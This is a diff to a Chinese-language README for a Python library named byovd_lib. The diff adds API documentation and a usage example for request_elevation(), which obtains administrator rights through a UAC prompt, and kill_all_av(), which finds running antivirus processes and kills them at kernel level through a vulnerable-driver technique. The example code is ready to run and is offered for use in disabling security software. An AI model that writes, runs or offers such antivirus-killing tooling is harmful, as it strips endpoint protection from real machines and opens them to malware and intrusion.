@@ -15,8 +15,15 @@ pip install pywin32 psutil
 ### 导入库
 
 ```python
-from byovd_lib import BYOVD
+from byovd_lib import BYOVD, request_elevation, kill_all_av
 
+# 自动请求管理员权限
+request_elevation()
+
+# 一键终结所有杀软
+kill_all_av()
+
+# 或使用 BYOVD 类
 with BYOVD() as byovd:
     # 你的代码
 ```
@@ -24,6 +31,27 @@ with BYOVD() as byovd:
 ---
 
 ## API 接口
+
+### 便捷函数
+
+| 函数 | 描述 | 参数 | 返回值 |
+|------|------|------|--------|
+| `request_elevation()` | 请求 UAC 管理员权限 | 无 | `bool` |
+| `kill_all_av(verbose)` | 一键终结所有杀毒软件 | `verbose: bool = True` | `list[(int, str, str, bool, str)]` |
+
+**`request_elevation()` 说明：**
+- 检查当前是否具有管理员权限
+- 如果没有，弹出 UAC 对话框请求提权
+- 用户确认后，以管理员身份重新启动脚本
+- 原进程退出，新进程继续执行
+
+**`kill_all_av(verbose)` 说明：**
+- 自动扫描所有运行的进程
+- 识别已知杀毒软件进程
+- 使用内核级方式终止
+- `verbose=True` 时输出详细信息
+
+返回值格式：`[(PID, 进程名，杀软名，成功标志，消息), ...]`
 
 ### 驱动管理
 
@@ -52,6 +80,23 @@ with BYOVD() as byovd:
 ---
 
 ## 使用示例
+
+### 一键终结杀软
+
+```python
+from byovd_lib import request_elevation, kill_all_av
+
+# 请求管理员权限
+request_elevation()
+
+# 终结所有杀毒软件
+results = kill_all_av()
+for pid, name, av, success, msg in results:
+    status = "[+]" if success else "[-]"
+    print(f"{status} {av} ({name}, PID: {pid}): {msg}")
+
+print(f"完成：成功终止 {sum(1 for r in results if r[3])}/{len(results)} 个进程")
+```
 
 ### 基本用法
 
